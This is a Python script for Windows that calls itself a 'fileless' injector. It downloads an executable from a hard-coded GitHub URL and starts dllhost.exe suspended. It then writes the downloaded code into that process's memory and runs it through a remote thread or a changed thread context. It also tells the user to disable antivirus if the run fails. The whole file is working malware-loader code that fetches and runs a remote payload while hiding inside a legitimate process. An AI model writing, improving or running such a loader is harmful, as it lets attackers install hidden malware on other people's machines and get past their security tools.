# Save as fixed_final_injector.py
import ctypes
import urllib.request
import struct
import sys

# Windows API
k32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4

def download_exe(url):
    """Download EXE from URL"""
    print(f"[1] Downloading: {url}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            data = response.read()
            print(f"[2] Downloaded {len(data):,} bytes")
            return data
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return None

def create_suspended_process():
    """Create suspended process for injection"""
    print("[3] Creating suspended process...")
    
    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb", ctypes.c_ulong),
            ("lpReserved", ctypes.c_wchar_p),
            ("lpDesktop", ctypes.c_wchar_p),
            ("lpTitle", ctypes.c_wchar_p),
            ("dwX", ctypes.c_ulong),
            ("dwY", ctypes.c_ulong),
            ("dwXSize", ctypes.c_ulong),
            ("dwYSize", ctypes.c_ulong),
            ("dwXCountChars", ctypes.c_ulong),
            ("dwYCountChars", ctypes.c_ulong),
            ("dwFillAttribute", ctypes.c_ulong),
            ("dwFlags", ctypes.c_ulong),
            ("wShowWindow", ctypes.c_ushort),
            ("cbReserved2", ctypes.c_ushort),
            ("lpReserved2", ctypes.c_void_p),
            ("hStdInput", ctypes.c_void_p),
            ("hStdOutput", ctypes.c_void_p),
            ("hStdError", ctypes.c_void_p),
        ]
    
    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", ctypes.c_void_p),
            ("hThread", ctypes.c_void_p),
            ("dwProcessId", ctypes.c_ulong),
            ("dwThreadId", ctypes.c_ulong),
        ]
    
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    si.lpDesktop = "WinSta0\\Default"
    pi = PROCESS_INFORMATION()
    
    # Create suspended process (dllhost.exe works well)
    if k32.CreateProcessW(
        None,
        "dllhost.exe",
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    ):
        print(f"[4] Created process (PID: {pi.dwProcessId})")
        return pi
    else:
        print("[-] Failed to create process")
        return None

def is_64bit_pe(pe_data):
    """Check if PE is 64-bit"""
    if len(pe_data) < 64:
        return False
    
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    if pe_offset + 24 > len(pe_data):
        return False
    
    # Check Machine field in COFF header
    machine = struct.unpack('<H', pe_data[pe_offset+4:pe_offset+6])[0]
    # 0x8664 = AMD64 (x64), 0x14c = i386 (x86)
    return machine == 0x8664

def inject_pe_fileless(pe_data, pi):
    """Simple and reliable fileless injection"""
    print("[5] Starting fileless injection...")
    
    if len(pe_data) < 64:
        print("[-] PE too small")
        return False
    
    # Parse PE headers
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    
    # Get image size
    if pe_offset + 84 > len(pe_data):
        print("[-] Invalid PE structure")
        return False
    
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[6] Image size: {image_size:,} bytes")
    
    # Check if 64-bit
    is_64bit = is_64bit_pe(pe_data)
    print(f"[7] Architecture: {'x64' if is_64bit else 'x86'}")
    
    # Allocate memory in target process
    alloc_addr = k32.VirtualAllocEx(
        pi.hProcess,
        0,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not alloc_addr:
        print("[-] Memory allocation failed")
        return False
    
    print(f"[8] Allocated at: {hex(alloc_addr)}")
    
    # Write entire PE to allocated memory
    written = ctypes.c_size_t(0)
    
    # Create buffer
    buffer_type = ctypes.c_char * len(pe_data)
    buffer = buffer_type.from_buffer_copy(pe_data)
    
    result = k32.WriteProcessMemory(
        pi.hProcess,
        alloc_addr,
        ctypes.byref(buffer),
        len(pe_data),
        ctypes.byref(written)
    )
    
    if not result:
        print("[-] WriteProcessMemory failed")
        return False
    
    print(f"[9] Wrote {written.value:,} bytes")
    
    # Calculate entry point
    entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
    entry_addr = alloc_addr + entry_point
    print(f"[10] Entry point: {hex(entry_addr)}")
    
    # Method 1: Create remote thread (most reliable)
    thread_id = ctypes.c_ulong(0)
    h_thread = k32.CreateRemoteThread(
        pi.hProcess,
        None,
        0,
        ctypes.cast(entry_addr, ctypes.c_void_p),
        None,
        0,
        ctypes.byref(thread_id)
    )
    
    if h_thread:
        print(f"[11] Remote thread created (TID: {thread_id.value})")
        k32.CloseHandle(h_thread)
        
        # Terminate original thread
        k32.TerminateThread(pi.hThread, 0)
    else:
        # Method 2: Set thread context
        print("[11] Creating thread context...")
        
        # Simple context structure
        class CONTEXT(ctypes.Structure):
            _fields_ = [
                ("p1", ctypes.c_ulonglong * 6),
                ("flags", ctypes.c_ulong),
                ("mxcsr", ctypes.c_ulong),
                ("seg_cs", ctypes.c_ushort),
                ("seg_ds", ctypes.c_ushort),
                ("seg_es", ctypes.c_ushort),
                ("seg_fs", ctypes.c_ushort),
                ("seg_gs", ctypes.c_ushort),
                ("seg_ss", ctypes.c_ushort),
                ("eflags", ctypes.c_ulong),
                ("dr0", ctypes.c_ulonglong),
                ("dr1", ctypes.c_ulonglong),
                ("dr2", ctypes.c_ulonglong),
                ("dr3", ctypes.c_ulonglong),
                ("dr6", ctypes.c_ulonglong),
                ("dr7", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong),
                ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong),
                ("rbx", ctypes.c_ulonglong),
                ("rsp", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong),
                ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong),
                ("r8", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong),
                ("r10", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong),
                ("r12", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong),
                ("r14", ctypes.c_ulonglong),
                ("r15", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong),
                ("xmm", ctypes.c_byte * 512),
            ]
        
        context = CONTEXT()
        context.flags = 0x10007  # CONTEXT_FULL
        
        if k32.GetThreadContext(pi.hThread, ctypes.byref(context)):
            context.rcx = entry_addr
            k32.SetThreadContext(pi.hThread, ctypes.byref(context))
            print("[12] Thread context set")
    
    # Resume thread
    print("[13] Resuming process...")
    k32.ResumeThread(pi.hThread)
    
    # Cleanup
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Injection successful!")
    return True

def main():
    print("=== SIMPLE Fileless GUI Injector ===")
    print("No complex process hollowing - just works")
    print("=" * 45)
    
    # Check admin
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print("⚠  Run as Administrator!")
            print("   Right-click → Run as administrator")
            return
    except:
        pass
    
    print("✅ Running as admin")
    
    # Your EXE
    default_url = "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
    
    print(f"\n📁 EXE: {default_url}")
    
    use_default = input("\nPress Enter to use default, or 'n' for custom: ")
    if use_default.lower() == 'n':
        url = input("Enter URL: ")
    else:
        url = default_url
    
    print(f"\n🚀 Starting...")
    print("─" * 40)
    
    # Download
    pe_data = download_exe(url)
    if not pe_data:
        return
    
    # Validate
    if pe_data[0:2] != b'MZ':
        print("❌ Not a valid EXE")
        return
    
    # Create process
    pi = create_suspended_process()
    if not pi:
        return
    
    # Inject
    success = inject_pe_fileless(pe_data, pi)
    
    if success:
        print("\n" + "=" * 40)
        print("✅ SUCCESS!")
        print("✅ Fileless injection complete")
        print("✅ EXE running from memory")
        print("\n📝 Note: If GUI doesn't appear:")
        print("   • EXE might be console application")
        print("   • May require dependencies")
        print("   • Try a simple GUI app first")
        print("\n🔍 Check Task Manager for process")
    else:
        print("\n❌ Failed")
        print("Try:")
        print("1. Different target process")
        print("2. Simpler EXE")
        print("3. Disable AV")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
